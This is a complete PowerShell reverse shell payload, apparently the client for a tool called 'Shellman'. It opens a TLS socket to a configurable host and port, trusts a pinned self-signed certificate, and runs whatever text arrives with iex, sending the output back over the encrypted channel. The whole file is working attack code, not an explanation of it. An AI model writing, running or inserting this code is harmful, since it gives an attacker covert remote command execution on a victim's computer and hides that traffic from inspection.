$global:conn_host = 'localhost'
$global:port = 8080
$global:cert = [system.Text.Encoding]::UTF8.GetBytes(@"
-----BEGIN CERTIFICATE-----
MIIFiDCCA3ACAQAwDQYJKoZIhvcNAQENBQAwgYkxCzAJBgNVBAYTAktQMRIwEAYD
VQQIDAlQeW9uZ3lhbmcxETAPBgNVBAcMCFNoZWxsbWFuMREwDwYDVQQKDAhTaGVs
bG1hbjERMA8GA1UECwwIU2hlbGxtYW4xEjAQBgNVBAMMCWxvY2FsaG9zdDEZMBcG
CSqGSIb3DQEJARYKc2hAZWxsbS5hbjAeFw0yMDA0MjYyMDQ2MDVaFw0zMDA0MjQy
MDQ2MDVaMIGJMQswCQYDVQQGEwJLUDESMBAGA1UECAwJUHlvbmd5YW5nMREwDwYD
VQQHDAhTaGVsbG1hbjERMA8GA1UECgwIU2hlbGxtYW4xETAPBgNVBAsMCFNoZWxs
bWFuMRIwEAYDVQQDDAlsb2NhbGhvc3QxGTAXBgkqhkiG9w0BCQEWCnNoQGVsbG0u
YW4wggIiMA0GCSqGSIb3DQEBAQUAA4ICDwAwggIKAoICAQDBF79zPM1sQnDudj0h
VYY+nwd9CSplZfnLar/TpTie+cHyxn1R8XWgFaicjy+QiQGlblQrXZqRbAv08Cff
cbZwe7Sku7pgZdc32olF3EAWQg39UVfP1E9ZpVjLfBh4FtvI3I9Gzpu6XHFyBSSl
I5ldLt/0s4PCNyjpEQDOVBD2GW4YEFfqFfM7iDfXxZxDNpZOtit093pzHa6aiwnM
LaWAU98vxvwhLyUzU22BHwDOl9dxszJMZpWqi7X+82mGkbseUFFGcEPcGT2FMmNg
ziCyZ92GmK0hjTQg+4OtceEmw6cw+oe5oKjVkqqiVlEplZaQhBKgjp49NEkH+TVM
Qa0ilfezd5PsEzyz21VHwhBHhJkefCLibnKvV+yl197SKbT1K/oykTIs/NViSwyB
ugURr4mbiUewPlzR/CSJk0X+FClpkunnJdRXoxRexxvqbp4Y7/bzrMyjNu4HcoKS
vhvXJTh/cHh/TVfWnvH4iALkDX2Ls68tJ0dia3NVMIYvikQUBtxPhPN0UntY25Y1
8gpd3wT3CRpvGI/I4UyImvOckfoydosI6guD1VoeyZzK5M9oQEVKM9vZo0sfD50T
3u9DDxne8SRfVVLp+/wBX0ctXFm96ooCld0b07SBcgejMfhvoNWuEEk9O9E93EA2
jevPpiD95jKXQbkX9uiOXtAKEQIDAQABMA0GCSqGSIb3DQEBDQUAA4ICAQCkqMJ/
wD7TnheWGi3tC+QWyM3aNstquTSFiHYxi0MxgNWGuou74hZeKibWmpglp0zuLEny
Kqpu85fSRztEDPs8F7ivWqRakUi4ELBPce3vxzxj8GZ6TFLlXoKeArC958LJZMeB
y70RjaWUsQrtf/WO+WWQUtezTtD8jT6RtRTprS3xOP2KiQ/Ucxnf5ck4/lETGLr5
9at8zh9/9rFfVWaI3c2BkuSvbuzHnAwrmmqhlBklDBoy+xsQ/rqLInYLsiLriJIX
qmSOkY8K6+p92lK5T9ctqM25tqTu6Krr0yO3flqX+5JJkXwkrOI/Ocqj9beDbpuQ
kfVXHdhpRMjoZoJl21np/EIU5r85opYYT1YGtkdG5OhQV99msjusn+LCuOSbBf7j
Y7krAuN2QTXkmxj3NENabibAC4/zpxnGS6vZDIm8YtNJo2kWHMqHUiBn6ckLIFGj
rQOWoQ/yRx2KZLUvAH5ZMxW97iEysdAyHN+GE2B2lbzskxD6ag08NbGAGjFI34aT
Yt5/GjrFZSE2/GPWjk7OEfht5M6lV8de+YCLj4jlOlmg8WZLXEHfeOBg85Zf3lmx
4DsQAw6e9Spf/x+0cJ4Sdjku+vvkkkuRQeTiXNf5MeghLaxIMB/p1lmhWc3WEkbi
LLEQN/Vv4AlCSFsh0DppVB7W+B5VuCpfCeQ5Ew==
-----END CERTIFICATE-----
"@)

$callback = [System.Net.Security.RemoteCertificateValidationCallback]{
    param (
        [object] $sender,
        [System.Security.Cryptography.X509Certificates.X509Certificate] $certificate,
        [System.Security.Cryptography.X509Certificates.X509Chain] $chain,
        [System.Net.Security.SslPolicyErrors] $sslPolicyErrors
    )

    if ($sslPolicyErrors -eq [System.Net.Security.SslPolicyErrors]::None){
        return $true
    }

    if ($sslPolicyErrors -ne [System.Net.Security.SslPolicyErrors]::RemoteCertificateChainErrors){
        return $false
    }

    $cchain = New-Object System.Security.Cryptography.X509Certificates.X509Chain
    $cacert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2(,$global:cert)
    $givencert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2($certificate)
    $null = $cchain.ChainPolicy.ExtraStore.Add($cacert)
    $cchain.ChainPolicy.VerificationFlags = [System.Security.Cryptography.X509Certificates.X509VerificationFlags]::AllowUnknownCertificateAuthority;

    if (-Not $cchain.Build($givencert)){
        return $false
    }

    return ($cchain.ChainElements[$cchain.ChainElements.Count - 1].Certificate.Thumbprint -eq $cacert.thumbprint);
}

$socket = New-Object Net.Sockets.TcpClient($global:conn_host, $global:port)
$stream = $socket.GetStream()
$sslStream = New-Object System.Net.Security.SslStream($stream,$false,$callback)
$sslStream.AuthenticateAsClient($global:conn_host, $null, 'Tls12', $true)

[byte[]] $bytes = 0..65535 | %{0};

while(($i = $sslStream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
    $sendback = (iex $data | Out-String) 2>&1;
    $sendback2 = $sendback + "`n";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $sslStream.Write($sendbyte,0,$sendbyte.Length);
    $sslStream.Flush()
}